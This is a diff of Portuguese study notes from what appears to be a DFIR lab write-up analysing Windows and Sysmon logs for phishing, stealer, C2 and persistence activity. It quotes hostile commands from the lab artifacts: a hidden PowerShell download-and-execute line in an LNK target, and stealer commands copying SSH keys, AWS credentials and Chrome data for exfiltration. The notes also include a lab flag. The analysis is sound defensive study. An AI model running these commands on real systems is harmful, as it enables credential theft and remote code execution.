@@ -3,6 +3,7 @@ O primeiro passo de um atacante é conseguir acesso a um dispositivo e, para iss
 Muitos dispositivos possuem o serviço RDP ativo e com segurança fraca e, portanto, provavelmente estão infectados. Com isso é muito interessante estar vigilante sobre a ativação e o uso desse serviço.
 
 > Investigando
+
 Investigando o arquivo “RDP-Security.evtx”, começo filtrando por eventos de falha (4625) resultando em 1567 eventos, filtro o tipo do evento para 3 e 10 que significam logons remotos e investigo por endereços IP suspeitos. Além disso, procuro pelo nome do usuário logado (WIN-F89VT9ITR10$) através do ID 4624, no caso a conta utilizada para conseguir o primeiro acesso.
 -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Muitas extensões estão passando a serem bloqueadas porque atores de ameaça estão as utilizando para mascarar programas binários ou links para arquivos (LNK), como: 
@@ -113,6 +114,7 @@ já que os sistemas operacionais geralmente escondem as extensões dos arquivos 
 
 Para evitar detecção por antivírus, atacantes utilizam shortcuts de arquivos LNK que podem parecer atalhos para programas legítimos, mas com um pouco de investigação é possível identificar um programa para powershell
 > Investigando
+
 Investigando uma pasta compactada com um arquivo png e um arquivo chamado “Official Website.lnk” (ou seja, um shortcut), descomprimindo a pasta é possível visualizar o alvo do shortcut como `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -c iex (iwr -UseBasicParsing "http://wp16.hqywlqpa.thm:8000/cgi-bin/f").Content` 
 
 Investigando o arquivo de captura de log “Phishing-Sysmon.evtx”, é possível identificar que o arquivo “best-cat.jpg.exe”, ao ser executado, resultou no download da pasta “top-cats.zip” e que fora armazenado em “C:\Users\Administrator\Pictures” conforme visto no log. O PID associado é 5484 e o domínio acessado é “rjj.store” 
@@ -129,6 +131,7 @@ Após agentes de ameaça conseguirem acesso a um sistema, eles possuem duas opç
 Muitos ataques acontecem por cmd como em: editor BlackSuit Ransomware - The DFIR Report, porém eles são armazenados em logs, então é possível rastrear todos os passos de um agente de ameaça. Também podem invadir a GUI então terão ainda mais acesso assim como ao próprio CMD. 
 
 > Investigando
+
 Filtrar por criação de processos
 
 Você recebeu um cenário de análise forense/malware. O objetivo é executar um anexo malicioso em uma VM e investigar o comportamento dele usando os logs do Sysmon.
@@ -149,6 +152,7 @@ Os alvos de roubo de dados costumam ser: `C:\Users\<user>\AppData\Roaming\Signal
 Agentes de ameaça também podem coletar informações utilizando comandos simples como: type, notepad, copy, etc ou, mais comumente, utilizar programas próprios que dificultam a identificação do processo já que é um código próprio. Exemplo de caso: https://thedfirreport.com/2024/08/26/blacksuit-ransomware/#collection e informações sobre um algoritmo stealer: https://unit42.paloaltonetworks.com/new-malware-gremlin-stealer-for-sale-on-telegram/
 
 > Investigando
+
 Executando o “stealer.exe”, é possível identificar seus passo com o event viewer em que, após a sua execução, o programa começa com `cmd /c "mkdir %%temp%%\staging_58f1"` que cria uma pasta chamada literalmente “%%temp%%\staging_58f1” e copia o que estiver na área de transferência do usuário para o arquivo clipboard.txt com `powershell -c "Get-ClipBoard > $env:Temp\staging_58f1\clipboard.txt"` , depois faz `cmd /c "xcopy %%userprofile%%\.aws %%temp%%\staging_58f1\aws /i /y"`que copia a pasta inteira com os dados definindo o caminho alvo que, se não existir deve ser criada (/i) e confirmar tudo com /y. Rouba também chaves ssh `cmd /c "xcopy %%userprofile%%\.ssh %%temp%%\staging_58f1\ssh /i /y` , além de copiar também arquivos do word e seus subdiretórios (/s) com `cmd /c "xcopy %%userprofile%%\Desktop\*.docx %%temp%%\staging_58f1\desktop /i /s /y"` , pdfs `cmd /c "xcopy %%userprofile%%\Desktop\*.pdf %%temp%%\staging_58f1\desktop /i /s /y"` , xlsx `cmd /c "xcopy %%userprofile%%\Desktop\*.xlsx %%temp%%\staging_58f1\desktop /i /s /y”` , copia arquivos do usuário do google chrome `cmd /c xcopy "%%localappdata%%\Google\Chrome\User Data\Default" %%temp%%\staging_58f1\browser /i /y` e, por último, compacta a pasta com `powershell -c "Compress-Archive -Force -Path $env:Temp\staging_58f1 -DestinationPath $env:Temp\staging_58f1.zip"` . O atacante então utilizou um bucket de armazenamento da aws para transferir os arquivos exfiltrados
 
 Para transferir os dados exfiltrados, atacantes podem utilizar várias técnicas, como ditas no MITR3: https://attack.mitre.org/techniques/T1105/
@@ -185,6 +189,7 @@ Para identificar os serviços rodando é possível: identificar evento com ID 1 
 Persistência por run keys segue o mesmo processo de startup, mas ao invés de copiar o programa à pasta de appdata, é necessário criar uma chave nos registros do windows em “Run” e para acessá-los basta: `regedit.exe` , entrar na pasta `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run` e visualizar eventos com ID 13
 
 > Investigando C2
+
 Investigando o arquivo de log “Sysmon.evtx”, vejo que o arquivo cria um novo arquivo em C:\Users\Administrator\Downloads\URGENT!\URGENT!.lnk e depois aciona o powershell C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe , adicionando o arquivo de persistência em C:\Users\Administrator\AppData\Roaming\update.exe . O malware então tentou uma conexão com um servidor web como visto no seguinte log:
 
 ```
@@ -206,6 +211,7 @@ DestinationPortName: http
 Depois chamou o update.exe novamente "C:\Users\Administrator\AppData\Roaming\update.exe" e tenta uma conexão com o domínio route.m365officesync.workers.dev que se passa por legítimo, mas workers.dev é um subdomínio da cloudfare, mas a query está vazia retornando o código 9003. Isso pode indicar um Command and Control (C2) já que atacantes utilizam muito hospedagens de infraestruturas na clouflare.
 
 > Investigando - persistência
+
 Seguindo para o arquivo “Security.evtx” da pasta Task 3, descubro que primeiro o arquivo vai limpar os eventos de auditoria (1102), depois há vários logs de logon (4624 - sucesso e 4625 - falha). A primeira tentativa de logon foi bem sucedida pelo `NT AUTHORITY\SYSTEM` , mas foi do tipo 5 que indica um serviço do windows, o que pode indicar um evento normal do sistema. Após isso, há 6 eventos de logon de falha, do tipo 3 - aconteceu através da rede com o mesmo endereço IP que instalou o arquivo de persistência anteriormente “10.14.97.15”.
 
 Após isso, houve um evento 4611 que indica que um processo de logon confiável foi registrado no registro de segurança. Esse evento ocorre na inicialização do sistema ou quando um usuário faz login. Depois, novamente um logon como “Administrador” com credenciais explícitas (ID 4648) pelo IP 10.14.97.15 do tipo 10 que indica logon interativo remoto via RDP (ID 4624) o que dá acesso à GUI do sistema, mouse e teclado.
@@ -256,6 +262,7 @@ Privileges:		-
 </details>
 
 > Investigando Sysmon logs
+
 Após a adição de um novo usuário o invasor deixou dois backdoors no sistema e o reiniciou. O próprio sistema instalou uma atualização, como visto no log que o autor foi LocalSystem: Após isso o sistema (NT AUTHORITY\SYSTEM) criou uma tarefa agendada chamada “AmazonSync” (ID 4698) e, após as atualizações do sistema, descubro que o atacante, agora como administrador, fez o download de um arquivo chamado “troy.exe” e “nessie.exe” (este na pasta de help que não recebe arquivos executáveis - foi utilizado o programa falso “data protection service”) com tipo 2 para que inicialize sozinho, especificando o argumento <IdleSettings> para que o arquivo fique inativo quando o usuário estiver utilizando o dispositivo por pelo menos uma hora (PT1H) e quando o usuário não estiver utilizando para que realize as atividades maliciosas por pelo menos 10 minutos (PT10M). Para isso, ele utiliza a regra `<StopOnIdleEnd>true</StopOnIdleEnd>` que interrompe a execução do programa quando o usuário utiliza o computador e não seja identificado no gerenciador de tarefas por possíveis problemas de desempenho. Executo o arquivo troy.exe para conferir seu funcionamento e me deparo com a pergunta: 
 
 `Not so fast! What was my parent commandline?                                                      Example: C:\Windows\System32\os.exe -run`
@@ -295,6 +302,7 @@ explorer.exe C:\Windows\Explorer.EXE
 Tento fazer o mesmo com o processo Explorer, mas não dá certo porque o processo já foi executado e, com isso, preciso procurar pelo sysmon. Posso utilizar o seguinte comando Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" | Where-Object {$.Id -eq 1 -and $.Message -match "ProcessId: 4540"} | Select-Object -Property Message | Format-List que procura pelo histórico de segurança do windows (abro o histórico do sysmon, em que o ID é 1 - process creation e o id do processo é 4540, filtro pelas mensagens em formato de lista) e obtenho: C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule e o programa troy.exe me retorna a flag: THM{c2_is_on_schedule!} 
 
 > Investigando - backdoors
+
 Há dois arquivos: “Sysmon (Before reboot).evtx” e “Sysmon (After reboot).evtx”. Começando com o antes do reboot, noto que o processo 3192 abre um processo de terminal “cmd” em: 2025-07-04 22:05:48.439, depois esse processo cria um arquivo foi criado chamado “odin.cmd” (log1). Um detalhe interessante é a regra de persistência (TA0003) do MITR3 associada “RuleName: T1023” - Modificação de atalhos. Após, o programa utiliza o usuário atual para abrir um processo do chrome (log2) e uma dns query cujo nome é wpad, que é um mecanismo da web de busca por configurações de proxy na rede. 
 Foram observadas consultas DNS para wpad, relacionadas ao mecanismo de descoberta automática de proxy do Windows, executado pelo serviço WinHttpAutoProxySvc. Posteriormente foi identificada uma consulta ao domínio onecs-live.azureedge.net, pertencente à infraestrutura Microsoft Azure, normalmente associada a serviços legítimos do sistema operacional, incluindo telemetria e comunicação com serviços Microsoft. (log3)
 Também foi identificado o uso do utilitário reg.exe para adicionar o valor Basket na chave HKCU\Software\Microsoft\Windows\CurrentVersion\Run. O valor criado referencia o executável C:\Users\Public\kitten.exe, configurando sua execução automática durante o logon do usuário. O evento foi originado por um processo cmd.exe previamente observado criando o arquivo odin.cmd na pasta Startup, indicando múltiplos mecanismos de persistência no sistema. (log4)
